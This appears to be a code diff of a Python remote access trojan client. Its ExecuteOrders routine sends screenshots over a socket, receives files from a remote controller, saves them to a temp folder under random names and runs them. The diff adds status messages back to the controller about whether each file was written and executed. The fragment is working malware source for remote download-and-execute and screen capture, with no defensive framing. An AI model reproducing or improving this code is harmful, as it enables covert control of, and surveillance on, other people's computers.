@@ -76,6 +76,7 @@ def ExecuteOrders():
                     Data = F.read() # Read File Bytes
 
                     S.sendall(Data) # Send the Screenshot
+                        
 
             	F.close() # Close The File
             	
@@ -96,7 +97,15 @@ def ExecuteOrders():
 
             	Path = Temp+"/"+RandomSg()+"."+Ex
 
-            	F = open(Path, "wb")
+            	try:
+
+            		F = open(Path, "wb")
+            		S.send(str.encode("truefile"))
+
+            	except:
+
+            		S.send(str.encode("errorfile"))
+            		continue
 
             	while True:
 
@@ -106,26 +115,27 @@ def ExecuteOrders():
 
                     Check = len(Data)
 
-                    print(Check)
+                    print("Update")
 
                     if(1024 != Check): # If 1024 > length (Data) , Stop Loop
-
                         F.close() # Close File
+                        Execute = os.system('start '+Path) # Execute File
 
-                        os.system('start '+Path) # Execute File
+                        if(Execute == 0):
+                        	S.send(str.encode("executetrue"))
+
+                        else:
+                        	S.send(str.encode("executefalse"))
 
                         break
 
             except:
-
             	continue
-
 
 def Main():
     
     Create()
     Connect()
     ExecuteOrders()
-
 
 Main()
